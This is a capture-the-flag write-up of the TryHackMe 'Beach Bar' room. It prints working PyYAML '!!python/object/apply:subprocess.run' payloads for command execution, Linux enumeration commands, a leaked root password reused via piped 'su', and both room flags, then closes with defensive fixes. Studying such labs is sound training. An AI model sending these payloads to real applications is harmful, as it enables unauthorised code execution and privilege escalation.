Beach-Bar-Hacker-Holiday--Cybersecurity-Learning-Journey

# TryHackMe

> A practical walkthrough covering **YAML deserialization, Python object injection, command execution, credential discovery, and Linux privilege escalation**.

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20Linux-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange)
![Focus](https://img.shields.io/badge/Focus-YAML%20Deserialization-purple)

---

## 📌 Overview

This repository documents my walkthrough of the **Beach Bar** room on TryHackMe.

The machine demonstrates how an insecure YAML deserialization implementation can lead to **arbitrary command execution**. From there, enumeration reveals credentials exposed through a root-owned process, allowing privilege escalation to `root`.

The main attack chain was:

```text
Web Application
      │
      ▼
YAML Deserialization
      │
      ▼
Python Object Injection
      │
      ▼
subprocess.run()
      │
      ▼
Command Execution as bartender
      │
      ├──► User Flag
      │
      ▼
Process Enumeration
      │
      ▼
Root Process Credential Exposure
      │
      ▼
Credential Reuse
      │
      ▼
su → root
      │
      ▼
Root Flag
```

---

# 🎯 Learning Objectives

During this room I focused on:

* YAML deserialization vulnerabilities
* Python `PyYAML`
* Unsafe use of `yaml.load()`
* Python object construction
* `!!python/object/apply`
* Remote command execution
* Linux enumeration
* SUID enumeration
* Linux capabilities
* Process enumeration
* Credential exposure
* Credential reuse
* Privilege escalation
* Root access

---

# 🔎 Initial Access

The target exposed a web application with an **Import Playlist** feature.

The application allowed users to upload YAML playlist files.

The important discovery came from examining how the application processed YAML.

The application used:

```python
parsed = yaml.load(content, Loader=yaml.Loader)
```

This is dangerous because `yaml.Loader` can construct arbitrary Python objects from YAML input.

The vulnerable functionality therefore provided a path from:

```text
Attacker-controlled YAML
        ↓
Python object construction
        ↓
Python function execution
        ↓
OS command execution
```

---

# 💥 YAML Deserialization

The key payload structure was:

```yaml
playlist:
  name: Sudo3
  vibe: test
  tracks: []
  probe: !!python/object/apply:subprocess.run
    args:
      - ["sudo", "-n", "-l"]
    kwds:
      capture_output: true
      text: true
```

The `!!python/object/apply` constructor allows a Python callable to be invoked during YAML loading.

In this case:

```python
subprocess.run()
```

was executed by the server.

---

# 🧪 Confirming Command Execution

We confirmed command execution by executing:

```yaml
probe: !!python/object/apply:subprocess.check_output [["id"]]
```

The application returned:

```text
uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
```

This confirmed that arbitrary commands were being executed as:

```text
bartender
```

---

# 🚩 User Flag

After gaining command execution, I searched for the user flag:

```bash
find /home -name user.txt -type f -readable
```

The result revealed:

```text
/home/bartender/user.txt
```

I then read the file:

```bash
cat /home/bartender/user.txt
```

### User Flag

```text
THM{y4ml_pl4yl1st_pwns_th3_b34ch}
```

---

# 🖥️ Local Enumeration

With command execution established, I started enumerating the system.

First:

```bash
uname -a
```

Result showed an Ubuntu-based Linux environment.

Then:

```bash
id
```

confirmed:

```text
uid=1001(bartender)
gid=1001(bartender)
groups=1001(bartender)
```

---

# 🔐 SUID Enumeration

I checked for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

The system contained standard SUID binaries such as:

```text
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
```

Nothing immediately provided a useful privilege escalation path.

---

# 🧩 Linux Capabilities

I also checked Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

Interesting entries included:

```text
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/snapd/snap-confine ...
```

However, these did not provide the direct escalation path.

This was an important lesson:

> Enumeration is not just about finding something unusual — it is also about recognizing when a potential vector is not useful and continuing.

---

# 🔍 Process Enumeration

The breakthrough came from enumerating running processes:

```bash
ps aux | grep -E 'jukebox|gunicorn|python' | grep -v grep
```

The important process was:

```text
root ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

This was highly interesting.

The process was running as:

```text
root
```

and contained a credential directly in its command-line arguments:

```text
--stream-pass SunsetSpritz2024!
```

---

# 🧠 Understanding the Credential Exposure

The `jukeboxd` process was launched as root:

```text
root
└── /opt/beach-bar/jukeboxd/jukeboxd.py
        └── --stream-pass SunsetSpritz2024!
```

The credential was therefore visible to local process enumeration.

This is a classic operational security mistake:

```text
Sensitive credential
        ↓
Command-line argument
        ↓
Process list
        ↓
Accessible to local users
```

The discovery changed the privilege escalation strategy.

---

# ❌ Testing the Credential with sudo

I first tested whether the discovered password could be used with `sudo`:

```bash
echo 'SunsetSpritz2024!' | sudo -S -l
```

This failed.

The credential was **not the bartender user's sudo password**.

This was an important distinction.

Finding a password does not automatically mean:

```text
password = current user's password
```

---

# 🚀 Privilege Escalation

Since the credential belonged to the root-owned service context, I tested it against `su`.

The command was:

```bash
echo 'SunsetSpritz2024!' | su -c 'id; cat /root/root.txt' root
```

The output confirmed:

```text
uid=0(root) gid=0(root) groups=0(root)
```

We successfully obtained root privileges.

---

# 👑 Root Flag

After switching to root, the root flag was retrieved from:

```text
/root/root.txt
```

### Root Flag

```text
THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
```

---

# 🗺️ Complete Attack Path

```text
┌─────────────────────────────┐
│       Beach Bar Web App     │
└──────────────┬──────────────┘
               │
               ▼
       YAML Import Feature
               │
               ▼
       Unsafe yaml.load()
               │
               ▼
   !!python/object/apply
               │
               ▼
      subprocess.run()
               │
               ▼
       RCE as bartender
               │
       ┌───────┴────────┐
       ▼                ▼
  user.txt          Enumeration
       │                │
       ▼                ▼
  User Flag       ps / process list
                        │
                        ▼
               Root jukeboxd process
                        │
                        ▼
          --stream-pass credential
                        │
                        ▼
                 SunsetSpritz2024!
                        │
                        ▼
                     su root
                        │
                        ▼
                  uid=0(root)
                        │
                        ▼
                   Root Flag
```

---

# 🧰 Tools Used

| Tool            | Purpose                                                |
| --------------- | ------------------------------------------------------ |
| `curl`          | Interacting with the web application                   |
| `grep`          | Extracting results from HTTP responses                 |
| `cat`           | Reading files and payloads                             |
| `find`          | File and SUID enumeration                              |
| `id`            | Identifying the current user                           |
| `uname`         | System enumeration                                     |
| `ps`            | Process enumeration                                    |
| `getcap`        | Linux capability enumeration                           |
| `sudo`          | Privilege testing                                      |
| `su`            | Switching to root                                      |
| Python / PyYAML | Understanding the vulnerable deserialization mechanism |

---

# 🧪 Key Payload

The fundamental exploitation primitive was:

```yaml
probe: !!python/object/apply:subprocess.run
  args:
    - ["id"]
  kwds:
    capture_output: true
    text: true
```

This demonstrated that attacker-controlled YAML could cause the server to invoke Python functionality.

---

# 🛡️ Defensive Perspective

The vulnerability could have been prevented by avoiding unsafe YAML deserialization.

Instead of:

```python
yaml.load(content, Loader=yaml.Loader)
```

the application should use a safe loader:

```python
yaml.safe_load(content)
```

Additional security controls should include:

* Never deserialize untrusted YAML using unsafe loaders.
* Validate uploaded files against a strict schema.
* Avoid executing arbitrary Python objects from user-controlled input.
* Run web applications with the minimum required privileges.
* Never place passwords or secrets in process command-line arguments.
* Use environment variables or protected configuration mechanisms for service credentials.
* Use dedicated service accounts with minimal privileges.
* Monitor unusual child-process creation from web applications.
* Apply least privilege and defense-in-depth.

---

# 🧠 Lessons Learned

### 1. YAML can become dangerous code execution

YAML is not automatically safe simply because it looks like configuration data.

Unsafe Python YAML loaders can turn attacker-controlled data into executable behavior.

### 2. Enumeration needs to be broad

I initially investigated:

```text
SUID
Capabilities
Cron
Writable files
```

but the useful path came from:

```text
Running processes
```

### 3. Credentials can leak through processes

The root process exposed:

```text
--stream-pass SunsetSpritz2024!
```

A secret in a process argument can become visible to local users.

### 4. Credential context matters

The password did not work with:

```text
sudo
```

but worked with:

```text
su root
```

Understanding **which account owns a credential** is essential.

### 5. Don't stop after getting the first flag

The user flag was only the midpoint.

The real privilege escalation chain was:

```text
RCE
 ↓
bartender
 ↓
enumeration
 ↓
credential discovery
 ↓
credential reuse
 ↓
root
```

---

# 🏆 Flags

| Flag    | Value                                    |
| ------- | ---------------------------------------- |
| 👤 User | `THM{y4ml_pl4yl1st_pwns_th3_b34ch}`      |
| 👑 Root | `THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}` |

---

# 📚 Skills Demonstrated

* Web Application Security
* YAML Deserialization
* Python Security
* PyYAML
* Remote Command Execution
* Linux Enumeration
* SUID Enumeration
* Linux Capabilities
* Process Enumeration
* Credential Discovery
* Credential Reuse
* Privilege Escalation
* Root Access
* Secure Coding Principles

---

# ⚠️ Disclaimer

This repository is intended for **educational purposes and authorized security testing only**.

The techniques described here should only be used against systems where you have explicit permission to conduct security testing.

---

# 📌 Conclusion

The Beach Bar room was a great demonstration of how a seemingly simple file-upload/import feature can become a serious security vulnerability when unsafe deserialization is involved.

The most important part of the attack was not simply obtaining command execution, but using that access to systematically enumerate the host.

The final privilege escalation was achieved by discovering a credential exposed in the command-line arguments of a root-owned process and successfully reusing it to obtain a root shell.

The complete chain demonstrates why secure deserialization, credential management, process security, and least privilege are all critical components of a secure Linux application.

---

LinkedIn: [https://www.linkedin.com/feed/update/urn:li:activity:7489311439405469697/]

X: [https://x.com/charisma1385/status/2083545190057365693]

---

#TryHackMe #CyberSecurity #WebSecurity #YAML #PyYAML #Deserialization #RCE #Linux #PrivilegeEscalation #LinuxPrivilegeEscalation #Pentesting #EthicalHacking #CTF #CyberSecurityLearning #InfoSec #SecurityResearch #RedTeam #BugBounty #PythonSecurity
